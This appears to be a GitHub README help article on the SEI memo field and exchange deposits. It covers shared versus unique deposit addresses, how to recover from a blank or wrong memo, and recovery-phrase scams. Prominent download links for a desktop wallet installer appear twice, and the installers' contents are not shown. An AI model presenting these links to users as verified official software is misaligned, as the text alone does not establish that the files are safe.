![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">The Sei memo field and exchange deposits into Sei Wallet</h1>

<p align="center">When a memo is required, what happens without it, and who can help.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

A memo is a label attached to a transfer, and it exists because some services receive many customers' deposits at one address. The address identifies the service; the memo identifies you. Get the address wrong and the funds go somewhere else. Get the memo wrong and the funds reach the right place but the wrong name.

For a self-custody wallet the field is usually irrelevant, because your address is yours alone. It matters at the boundary — when you send *to* an exchange, or when an exchange still asks for the older Cosmos-style deposit details.

## What the field actually does

Three names for the same thing: memo, tag, destination tag. It is a short string carried alongside the transfer, outside the amount and the recipient.

- **On a shared deposit address**, it is the only thing separating your deposit from everyone else's. The exchange credits by matching address plus memo.
- **On a unique deposit address**, it is unnecessary; the address already identifies the account, which is why many EVM-style deposits have no memo field at all.
- **On a withdrawal to your own wallet**, there is nobody to route to. Your address is the whole destination, and [the app's receive flow](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) is where you copy it from.

A memo is not a password, not a secret, and not something to invent. It is routing information, and it has to match what the receiving service expects exactly.

## When Sei deposits need one

It depends on the route the exchange supports, and the route has changed.

**EVM-style deposits** use a `0x…` address that is unique to your account on that exchange. That is the current path, and it generally does not require a memo.

**Cosmos-style deposits** used a `sei1…` address, often a shared one, with a memo or tag to identify the customer. Sei's documentation puts that route under SIP-03 deprecation, and names 15 June 2026 as the milestone for whatever Cosmos interfaces remain. An exchange still presenting a `sei1…` deposit form with a required tag is describing the older arrangement.

The practical rule: **follow the exchange's own deposit page for the asset you are depositing**, and if it shows a memo field marked required, treat it as required. The wallet has no opinion on this; the exchange does.

## If you leave it blank

The funds generally arrive at the exchange and are not credited to you. That is the usual outcome, and it is a support ticket rather than a loss:

1. The deposit lands in the exchange's shared address.
2. The exchange cannot tell which customer sent it, because the matching field is empty.
3. You open a ticket with the transaction hash, the amount, the time and the address you sent to.
4. The exchange attributes it manually, usually after a delay and sometimes for a fee.

If the transfer failed outright rather than arriving unattributed, that is a different diagnosis, and [transaction errors explained](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-failed-what-to-check.md) is the right page.

Nothing about this requires your seed phrase, and no legitimate support process will ask for it. If someone claiming to be support asks for the phrase to "locate" the deposit, that is the scam, not the resolution — the pattern is in [the wrong-address article](https://github.com/sei-chain/sei-wallet-staking/blob/main/sent-to-the-wrong-address.md) and its scam section.

## If you get the memo wrong

Worse than blank, and still usually recoverable through support rather than by yourself. A memo pointing at another customer's account means the exchange credited someone else, and only the exchange can reverse its own ledger entry.

What helps: the transaction hash, the memo you actually used, and the memo you were supposed to use. What does not help: sending more funds to "correct" it, or contacting the other customer, whose identity you do not have.

## Common confusions worth separating

- **Memo versus address.** Sending to the right address with no memo is the blank-memo case. Sending to the wrong address with the right memo is a different problem, and a worse one, because the address is not the exchange's.
- **Memo versus the amount.** A memo does not affect how much arrives, and it cannot be used to "claim" a deposit that was never sent.
- **Memo versus password.** Nobody should ever ask you for a memo as proof of ownership in a chat. It is public routing data attached to a public transaction.
- **A memo on a transfer between your own wallets** is harmless and usually ignored, but it is also pointless.

## The one field that should never be involved

If any deposit flow asks for your recovery phrase, private key, or a screenshot of either, stop. No exchange needs it to credit a deposit, and no wallet needs it to receive one. The whole point of a memo is that routing information is enough.

If a deposit page looks like the exchange but arrived by link in a message, type the exchange's address yourself. A convincing clone will happily take a transfer and a memo.

## What to do before your next deposit

1. Open the exchange's deposit page for SEI, in the app or by typing the URL.
2. Note whether it gives a `0x…` or `sei1…` address, and whether a memo is marked required.
3. Copy the address from that page, not from history, because some exchanges rotate deposit addresses.
4. Send a small test deposit first if this is a new pair.
5. Confirm the credit, then send the rest.

Step four is the one people skip, and it is the only step that catches a wrong network or a stale address before the amount is large. If you are moving in from another wallet rather than an exchange, [the Compass move](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md) is the worked example of that handover.

## If it has already gone wrong

- **Blank or wrong memo:** ticket with the hash. The funds are at the exchange.
- **Wrong address entirely:** the address belongs to someone else, and the transfer is final. That case is covered in the wrong-address article, and no memo can rescue it.
- **Cosmos-style deposit to an EVM address:** check whether the exchange still supports that route at all. If it does not, the deposit may be unattributable no matter what the ticket says.
- **Transaction never confirmed:** nothing has arrived anywhere yet, and [a transaction that is stuck](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) is the article for that state rather than this one.

## Frequently asked questions

**Do I need a memo to receive SEI in my own wallet?** No. A self-custody address is yours alone, so there is nothing to route.

**Where do I find my memo?** On the exchange's deposit page for that asset, next to the address. It is issued by the exchange, not by the wallet.

**What happens if I forget the memo?** The deposit usually reaches the exchange but is not credited automatically. Open a ticket with the transaction hash.

**Is a memo the same as a password?** No. It is public routing information, and no legitimate party asks for it as proof of anything.

**Can a memo be changed after sending?** No. It is part of the transaction, and a confirmed transaction cannot be edited.

**Why does my exchange show a `sei1` address?** It is describing the older Cosmos-style deposit route. Sei's docs place that route under deprecation; check with the exchange before using it.

**Does a memo cost extra?** No. The fee is the network fee for the transfer, which is covered in [what a transfer costs](https://github.com/sei-chain/sei-wallet-staking/blob/main/gas-fees-and-fee-settings.md).

**What if the exchange asks for a tag and the wallet has no field?** Then that exchange's deposit route does not match this wallet's signing path. Use a route it does support, or ask the exchange, rather than improvising a value.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [A failed Sei Wallet transaction: what each error means](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-failed-what-to-check.md)
- [Sent SEI to the wrong address from Sei Wallet: what is recoverable](https://github.com/sei-chain/sei-wallet-staking/blob/main/sent-to-the-wrong-address.md)
- [Moving SEI off Compass to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-off-compass.md)
